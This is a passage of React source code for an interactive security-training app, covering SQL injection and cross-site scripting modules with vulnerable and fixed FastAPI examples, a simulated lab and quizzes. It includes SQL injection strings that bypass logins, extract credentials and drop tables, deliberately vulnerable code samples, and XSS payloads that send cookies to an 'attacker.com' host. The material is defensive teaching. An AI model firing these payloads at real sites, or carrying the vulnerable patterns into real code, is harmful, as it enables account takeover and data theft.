                    Grant administrative privileges to attackers.
                  </p>
                </div>
              </div>
            </div>

            {/* Section 3 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>

              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button
                  onClick={() => setCodeView('comparison')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'comparison'
                      ? 'bg-green-600 text-white'
                      : 'bg-slate-600 text-slate-300 hover:bg-slate-500'
                  }`}
                >
                  Before/After Comparison
                </button>
                <button
                  onClick={() => setCodeView('sidebyside')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'sidebyside'
                      ? 'bg-green-600 text-white'
                      : 'bg-slate-600 text-slate-300 hover:bg-slate-500'
                  }`}
                >
                  Side-by-Side View
                </button>
              </div>

              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-green-400 mb-3">✅ Secure Code with Changes Highlighted:</h4>
                  <PythonCode code={comparisonCode} />
                  <div className="mt-3 p-3 bg-slate-800 rounded-lg text-sm">
                    <p className="text-slate-300 mb-2">
                      <span className="text-red-400 font-bold">❌ Red comments</span> show old vulnerable code
                    </p>
                    <p className="text-slate-300">
                      <span className="text-green-400 font-bold">✅ Green comments</span> show new secure code
                    </p>
                  </div>
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE (Vulnerable):</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER (Secure):</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}

              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Why Parameterized Queries Work:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Separation of Code and Data:</strong> SQL structure defined separately from user input</li>
                  <li>• <strong>Literal Value Treatment:</strong> Input always treated as data, never as code</li>
                  <li>• <strong>Database-Level Protection:</strong> Driver handles escaping automatically</li>
                </ul>
              </div>
            </div>

            <button
              onClick={() => {
                setActiveTab('lab');
                onSectionComplete('learn');
              }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg"
            >
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {/* Lab Tab */}
        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Security Lab</h3>
              <p className="text-slate-300 mb-4">
                Try different SQL injection attacks below. This is a safe simulation - experiment freely!
              </p>
              
              {/* Attack Examples Reference */}
              <div className="bg-slate-700/50 rounded-lg p-4 mb-6">
                <h4 className="font-bold mb-3">SQL Injection Attacks to Try:</h4>
                <div className="grid md:grid-cols-2 gap-3">
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-green-400">✓ Safe Input:</p>
                    <button
                      onClick={() => setLabInput('admin')}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-green-300">admin</code> - Normal query
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-red-400">⚠️ Authentication Bypass:</p>
                    <button
                      onClick={() => setLabInput("admin' OR '1'='1")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-red-300">admin' OR '1'='1</code> - Returns all users
                    </button>
                    <button
                      onClick={() => setLabInput("admin'--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-red-300">admin'--</code> - Comments out password check
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-orange-400">⚠️ Data Extraction:</p>
                    <button
                      onClick={() => setLabInput("' UNION SELECT username, password, email FROM users--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-orange-300">UNION SELECT...</code> - Extract credentials
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-yellow-400">⚠️ Destructive:</p>
                    <button
                      onClick={() => setLabInput("admin'; DROP TABLE users;--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-yellow-300">DROP TABLE users</code> - Delete table
                    </button>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">Enter Username (or click examples above):</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: admin' OR '1'='1"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button
                    onClick={handleLabSubmit}
                    className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold transition-all"
                  >
                    Execute Query
                  </button>
                </div>
              </div>

              {labResult && (
                <div className="mt-6 space-y-4">
                  <div className={`rounded-lg p-4 border ${
                    labResult.safe 
                      ? 'bg-green-900/20 border-green-500/50' 
                      : 'bg-red-900/20 border-red-500/50'
                  }`}>
                    <h4 className="font-bold mb-2 flex items-center gap-2">
                      {labResult.safe ? (
                        <CheckCircle className="w-5 h-5 text-green-400" />
                      ) : (
                        <XCircle className="w-5 h-5 text-red-400" />
                      )}
                      {labResult.message}
                    </h4>
                    <p className="text-sm mb-2">
                      <strong>Generated SQL Query:</strong>
                    </p>
                    <code className="block bg-slate-900 p-3 rounded text-sm text-purple-300 overflow-x-auto">
                      {labResult.query}
                    </code>
                    {labResult.impact && (
                      <div className="mt-3 p-3 bg-red-900/30 border border-red-500/50 rounded">
                        <p className="text-sm font-bold text-red-400">{labResult.impact}</p>
                      </div>
                    )}
                    
                    {!labResult.safe && (
                      <div className="mt-3 p-3 bg-blue-900/20 border border-blue-500/50 rounded">
                        <p className="text-sm text-blue-300">
                          <strong>What Happened:</strong> The input was treated as SQL code instead of data. 
                          Special characters like <code className="bg-slate-800 px-1 rounded">'</code> and 
                          keywords like <code className="bg-slate-800 px-1 rounded">OR</code> changed the query logic.
                        </p>
                      </div>
                    )}
                  </div>

                  {labResult.data.length > 0 && (
                    <div className="bg-slate-900 rounded-lg p-4">
                      <h4 className="font-bold mb-3">Database Query Results:</h4>
                      <div className="overflow-x-auto">
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b border-slate-700">
                              <th className="text-left p-2">ID</th>
                              <th className="text-left p-2">Username</th>
                              <th className="text-left p-2">Password</th>
                              <th className="text-left p-2">Email</th>
                            </tr>
                          </thead>
                          <tbody>
                            {labResult.data.map((user, idx) => (
                              <tr key={idx} className="border-b border-slate-800">
                                <td className="p-2">{user.id}</td>
                                <td className="p-2">{user.username}</td>
                                <td className="p-2 text-red-400 font-mono">{user.password}</td>
                                <td className="p-2">{user.email}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                      {labResult.data.length > 1 && !labResult.safe && (
                        <p className="mt-3 text-sm text-red-400 font-semibold">
                          ⚠️ Notice: Query returned {labResult.data.length} users when it should only return 1! 
                          This is a successful SQL injection attack.
                        </p>
                      )}
                    </div>
                  )}

                  {/* Show how parameterized query would prevent this */}
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-2">✅ How Parameterized Query Prevents This:</h4>
                    <code className="block bg-slate-900 p-3 rounded text-sm text-green-300 mb-2">
                      cursor.execute("SELECT * FROM users WHERE username = ?", ("{labInput}",))
                    </code>
                    <p className="text-sm text-slate-300">
                      With parameterized queries, your input <code className="bg-slate-800 px-2 py-1 rounded">{labInput}</code> would 
                      be treated as a literal string value. The database would search for a username that exactly matches that entire 
                      string (including quotes and SQL keywords), finding nothing. <strong className="text-green-400">Attack blocked!</strong>
                    </p>
                  </div>
                </div>
              )}
            </div>

            <button
              onClick={() => setActiveTab('quiz')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg"
            >
              Ready for the Quiz? →
            </button>
          </div>
        )}

        {/* Quiz Tab */}
        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz 
              questions={quizQuestions}
              onComplete={() => onSectionComplete('quiz')}
            />
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// XSS MODULE
// ============================================================================

const XSSModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`;

  const secureCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    # SAFE: Escape HTML special characters
    safe_query = html.escape(query)
    
    response = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {safe_query}</p>
        </body>
    </html>
    """
    return response`;

  const comparisonCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    
    # ❌ OLD (VULNERABLE): Direct insertion into HTML
    # html_content = f"<p>You searched for: {query}</p>"
    
    # ✅ NEW (SECURE): Escape HTML special characters
    safe_query = html.escape(query)
    html_content = f"<p>You searched for: {safe_query}</p>"
    
    return f"""
    <html>
        <body>
            <h1>Search Results</h1>
            {html_content}
        </body>
    </html>
    """`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes XSS attacks possible?",
      options: [
        "Weak passwords",
        "Inserting untrusted data into web pages without proper encoding",
        "Using old browsers",
        "Not using HTTPS"
      ],
      correct: 1,
      explanation: "XSS occurs when untrusted data (user input) is inserted into web pages without proper encoding/escaping, allowing malicious scripts to execute."
    },
    {
      id: 2,
      question: "What is the primary defense against XSS?",
      options: [
        "Using HTTPS only",
        "Disabling JavaScript",
        "HTML encoding/escaping user input",
        "Hiding the source code"
      ],
      correct: 2,
      explanation: "HTML encoding (escaping) converts special characters like < > & into safe HTML entities, preventing browsers from interpreting them as code."
    },
    {
      id: 3,
      question: "What does html.escape() do in Python?",
      options: [
        "Removes all HTML from input",
        "Converts special characters to HTML entities",
        "Encrypts the HTML",
        "Compresses the HTML"
      ],
      correct: 1,
      explanation: "html.escape() converts characters like < to &lt; and > to &gt;, making them display as text instead of being interpreted as HTML/JavaScript."
    },
    {
      id: 4,
      question: "Which type of XSS injects malicious scripts that are stored in the database?",
      options: [
        "Reflected XSS",
        "DOM-based XSS",
        "Stored (Persistent) XSS",
        "Client-side XSS"
      ],
      correct: 2,
      explanation: "Stored XSS saves malicious scripts in the database (e.g., in comments or profiles), which then execute when other users view that content."
    }
  ];

  const handleLabSubmit = () => {
    const lowerInput = labInput.toLowerCase();
    
    // Detect different types of XSS attacks
    const hasScript = lowerInput.includes('<script');
    const hasImgOnerror = lowerInput.includes('onerror');
    const hasOnload = lowerInput.includes('onload');
    const hasSvg = lowerInput.includes('<svg');
    const hasIframe = lowerInput.includes('<iframe');
    const hasEventHandler = lowerInput.includes('on') && (lowerInput.includes('=') || lowerInput.includes('click') || lowerInput.includes('mouse'));
    
    const isAttack = hasScript || hasImgOnerror || hasOnload || hasSvg || hasIframe || hasEventHandler;
    
    let attackType = '';
    let attackExplanation = '';
    
    if (hasScript) {
      attackType = 'Direct Script Injection';
      attackExplanation = 'The <script> tag would execute JavaScript immediately when the page loads. This is the most common XSS attack vector.';
    } else if (hasImgOnerror) {
      attackType = 'Image Event Handler Attack';
      attackExplanation = 'The onerror event handler fires when the image fails to load. Since "x" is not a valid image, the malicious JavaScript in onerror executes.';
    } else if (hasSvg && hasOnload) {
      attackType = 'SVG-based XSS';
      attackExplanation = 'SVG elements support onload events. This payload executes JavaScript when the SVG loads.';
    } else if (hasIframe) {
      attackType = 'Iframe Injection';
      attackExplanation = 'Iframes can load external malicious content or execute JavaScript via the src attribute.';
    } else if (hasEventHandler) {
      attackType = 'Event Handler Injection';
      attackExplanation = 'HTML event handlers (onclick, onmouseover, etc.) can execute JavaScript when triggered by user interaction.';
    }
    
    setLabResult({
      input: labInput,
      vulnerable: `<p>You searched for: ${labInput}</p>`,
      secure: `<p>You searched for: ${labInput.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;')}</p>`,
      isAttack,
      attackType,
      attackExplanation
    });
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Eye className="w-10 h-10 text-orange-400" />
            <h1 className="text-4xl font-bold">Cross-Site Scripting (XSS)</h1>
          </div>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding XSS - Three Main Types
              </h3>
              
              <p className="text-slate-300 mb-4">
                Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages. There are three primary types of XSS attacks, each with different characteristics and attack vectors.
              </p>

              {/* Type 1: Reflected XSS */}
              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-3">🔴 Type 1: Reflected XSS (Non-Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is reflected off the web server, typically through URL parameters or form inputs. The attack is delivered via a crafted link.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/search?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    When victim clicks the link, the script executes in their browser immediately.
                  </p>
                </div>
              </div>

              {/* Type 2: Stored XSS */}
              <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Type 2: Stored XSS (Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is permanently stored on the target server (database, comment system, user profile). Every user who views the affected page gets attacked.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """⚠️ VULNERABLE - Stores unsanitized input"""
    comments_db.append({"username": username, "comment": comment})
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """⚠️ VULNERABLE - Displays unsanitized stored data"""
    html = "<html><body><h1>Comments</h1>"
    for c in comments_db:
        # DANGEROUS: Directly embedding stored user input
        html += f"<p><b>{c['username']}</b>: {c['comment']}</p>"
    html += "</body></html>"
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Scenario:</p>
                  <p className="text-xs text-slate-300 mb-2">1. Attacker posts comment: <code className="bg-slate-700 px-1 rounded text-red-300">&lt;script&gt;steal_cookies()&lt;/script&gt;</code></p>
                  <p className="text-xs text-slate-300 mb-2">2. Malicious script saved to database</p>
                  <p className="text-xs text-slate-300">3. Every user viewing comments gets attacked automatically</p>
                  <p className="text-xs text-red-400 mt-2">⚠️ Most dangerous - affects all users, not just link clickers!</p>
                </div>
              </div>

              {/* Type 3: DOM-based XSS */}
              <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Type 3: DOM-Based XSS (Client-Side)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The vulnerability exists in client-side JavaScript code. The attack payload is never sent to the server - it's executed entirely in the browser's DOM.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Code:</p>
                  <pre className="bg-slate-800 p-3 rounded text-xs font-mono text-slate-300">
{`<script>
  // VULNERABLE: Reading from URL and inserting into DOM
  const params = new URLSearchParams(window.location.search);
  const userInput = params.get('name');
  
  // DANGEROUS: Direct insertion into innerHTML
  document.getElementById('welcome').innerHTML = 
    'Hello ' + userInput;
</script>`}
                  </pre>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/page#name=&lt;img src=x onerror=alert(1)&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    The fragment (#) isn't sent to server, so server-side protections don't help. Pure client-side vulnerability.
                  </p>
                </div>
              </div>

              {/* Comparison Table */}
              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">XSS Type Comparison:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Type</th>
                        <th className="text-left p-2 text-purple-400">Stored on Server?</th>
                        <th className="text-left p-2 text-purple-400">Attack Delivery</th>
                        <th className="text-left p-2 text-purple-400">Severity</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Reflected</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">Crafted URL/link</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Stored</td>
                        <td className="p-2 text-slate-300">Yes (database)</td>
                        <td className="p-2 text-slate-300">Automatic on page load</td>
                        <td className="p-2 text-red-400">Critical</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">DOM-Based</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">URL fragment manipulation</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Attack Examples
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4 mb-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🍪 Session Hijacking</h4>
                  <p className="text-sm text-slate-300 mb-2">Steal session cookies to impersonate users</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-red-300">
                      &lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;
                    </code>
                  </div>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🎣 Credential Theft</h4>
                  <p className="text-sm text-slate-300 mb-2">Create fake login forms to capture passwords</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-orange-300">
                      Inject fake form overlaying real login
                    </code>
                  </div>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🔀 Page Defacement</h4>
                  <p className="text-sm text-slate-300 mb-2">Modify page content to spread misinformation</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-yellow-300">
                      document.body.innerHTML='Hacked!'
                    </code>
                  </div>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📡 Keylogging</h4>
                  <p className="text-sm text-slate-300 mb-2">Record user keystrokes to capture sensitive data</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-purple-300">
                      addEventListener('keypress', log)
                    </code>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-red-400">Detailed Attack Scenarios:</h4>
                <div className="space-y-3 text-sm">
                  <div className="border-l-4 border-red-500 pl-3">
                    <p className="font-semibold text-red-400 mb-1">Cookie Theft Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects: <code className="bg-slate-800 px-2 py-1 rounded text-xs">&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></p>
                    <p className="text-slate-400 text-xs">Impact: Session token sent to attacker, who can now impersonate the victim</p>
                  </div>

                  <div className="border-l-4 border-orange-500 pl-3">
                    <p className="font-semibold text-orange-400 mb-1">Phishing Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects fake login form that submits to attacker's server</p>
                    <p className="text-slate-400 text-xs">Impact: Victims enter credentials thinking they're logging into legitimate site</p>
                  </div>

                  <div className="border-l-4 border-yellow-500 pl-3">
                    <p className="font-semibold text-yellow-400 mb-1">Malware Distribution:</p>
                    <p className="text-slate-300 mb-2">Inject script that redirects users to malware download sites</p>
                    <p className="text-slate-400 text-xs">Impact: Users' computers infected with ransomware, spyware, or trojans</p>
                  </div>

                  <div className="border-l-4 border-purple-500 pl-3">
                    <p className="font-semibold text-purple-400 mb-1">Cryptojacking:</p>
                    <p className="text-slate-300 mb-2">Inject cryptocurrency mining script that runs in victim's browser</p>
                    <p className="text-slate-400 text-xs">Impact: Victim's CPU used for mining, slowing down computer and increasing electricity costs</p>
                  </div>

                  <div className="border-l-4 border-blue-500 pl-3">
                    <p className="font-semibold text-blue-400 mb-1">Account Actions:</p>
                    <p className="text-slate-300 mb-2">Execute actions as the victim: post content, change settings, make purchases</p>
                    <p className="text-slate-400 text-xs">Impact: Unauthorized transactions, spam posts, reputation damage</p>
                  </div>
                </div>

                <div className="mt-4 p-3 bg-slate-800 rounded-lg">
                  <h5 className="font-bold mb-2 text-sm">📊 Real-World Statistics:</h5>
                  <ul className="space-y-1 text-xs text-slate-300">
                    <li>• XSS found in 53% of web applications (2023 security report)</li>
                    <li>• #1 most common vulnerability in OWASP Top 10</li>
                    <li>• Average remediation cost: $8,000 per vulnerability</li>
                    <li>• Famous victims: eBay, MySpace, YouTube, Facebook, Twitter</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Defense for Each XSS Type
              </h3>

              {/* Defense against Reflected XSS */}
              <div className="mb-6">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Reflected XSS:</h4>
                
                <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                  <button
                    onClick={() => setCodeView('comparison')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Before/After Comparison
                  </button>
                  <button
                    onClick={() => setCodeView('sidebyside')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Side-by-Side View
                  </button>
                </div>

                {codeView === 'comparison' ? (
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <PythonCode code={comparisonCode} />
                  </div>
                ) : (
                  <div className="grid md:grid-cols-2 gap-4">
                    <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-red-400 mb-3 text-sm">❌ BEFORE:</h5>
                      <PythonCode code={vulnerableCode} />
                    </div>
                    <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-green-400 mb-3 text-sm">✅ AFTER:</h5>
                      <PythonCode code={secureCode} />
                    </div>
                  </div>
                )}
              </div>

              {/* Defense against Stored XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Stored XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires TWO layers: sanitize on INPUT (storage) AND escape on OUTPUT (display)
                </p>
                
                <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html
# Note: Install bleach library for HTML sanitization
# pip install bleach
import bleach

app = FastAPI()
comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """✅ SECURE - Sanitize before storing"""
    
    # ✅ LAYER 1: Sanitize input before storing
    # Remove dangerous HTML tags, keep safe ones
    safe_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'u', 'p', 'br'],  # Allowed tags
        strip=True  # Remove disallowed tags
    )
    
    comments_db.append({
        "username": html.escape(username),
        "comment": safe_comment
    })
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """✅ SECURE - Escape on output as well"""
    html_content = "<html><body><h1>Comments</h1>"
    
    for c in comments_db:
        # ✅ LAYER 2: Escape again when displaying (defense in depth)
        safe_username = html.escape(c['username'])
        safe_comment = html.escape(c['comment'])
        html_content += f"<p><b>{safe_username}</b>: {safe_comment}</p>"
    
    html_content += "</body></html>"
    return html_content`} />
              </div>

              {/* Defense against DOM-based XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against DOM-Based XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires secure JavaScript practices on the client-side
                </p>
                
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-red-400 mb-2 text-sm">❌ Vulnerable JavaScript:</h5>
                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// DANGEROUS: Using innerHTML
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .innerHTML = 'Hello ' + name;`}
                    </pre>
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-green-400 mb-2 text-sm">✅ Secure JavaScript:</h5>
